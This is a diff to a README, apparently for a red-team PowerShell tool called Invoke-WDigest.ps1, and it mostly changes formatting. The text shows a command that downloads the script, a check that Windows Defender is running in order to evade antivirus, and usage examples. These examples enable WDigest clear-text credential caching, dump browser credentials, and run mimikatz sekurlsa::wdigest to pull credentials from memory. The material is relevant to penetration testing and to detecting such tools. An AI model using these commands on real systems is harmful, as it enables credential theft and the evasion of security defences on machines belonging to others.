@@ -6,9 +6,6 @@
 
 <br /><br />
 
-
-
-
 |Parameter|Description|Defaul value|
 |---|---|---|
 |WDigest|Activate WDigest credential caching in Memory?|<b><i>true</i></b>|
@@ -22,14 +19,14 @@
 
 <br /><br />
 
-**download Invoke-WDigest.ps1**
+<b><i>download Invoke-WDigest.ps1</i></b>
 ```powershell
 iwr -uri "https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/lib/DeviceGuard/Invoke-WDigest.ps1" -OutFile "Invoke-WDigest.ps1"
 ```
 
 <br />
 
-**Pre-Requesites Checks:**
+<b><i>pre-requesites checks:</i></b>
 > **Warning**: Invoke-WDigest.ps1 cmdlet only bypasses Anti-Virus detection if windows defender its the only AV running in target system.
 ```powershell
 #Make sure Windows Defender service its running
@@ -41,7 +38,7 @@ iwr -uri "https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/lib/Device
 
 <br /><br />
 
-**run cmdlet:**
+<b><i>cmdlet syntax examples:</i></b>
 ```powershell
 # Cmdlet help
 Get-Help .\Invoke-WDigest.ps1 -full
@@ -63,11 +60,10 @@ Get-Help .\Invoke-WDigest.ps1 -full
 
 # Dump browsers credentials without WDiget catching
 .\Invoke-WDigest.ps1 -wdigest 'false' -browsercreds
+```
 
-
-
-[WDIGEST MEMORY CATCHING - FAST DEMONSTRATION]
-
+<b><i>[WDIGEST MEMORY CATCHING - FAST DEMONSTRATION]</i></b>
+```powershell
 ## WDigest caching + dump (-runas) created credential with mimikatz
 .\Invoke-WDigest.ps1 -WDigest 'true' -manycats -runas
 
@@ -78,11 +74,6 @@ WORKFLOW
    - WDigest will store (runas) credential input by user in clear-text in memory
      - [Downside] -runas command (wdigest) only stores 'valid' credentials in-memory.   
    - mimikatz will auto-execute 'mimikatz sekurlsa::wdigest exit' to dump credentials
-
-REMARK
-   RunAs parameter switch pauses this cmdlet execution until one credential its inputed,
-   then starts cmd.exe with suplied credential in a hidden windows (detach from parent).
-   Child process its necessary for mimikatz 'sekurlsa::wdigest' dump the cred from Memory.
 ```
 
 <br /><br />
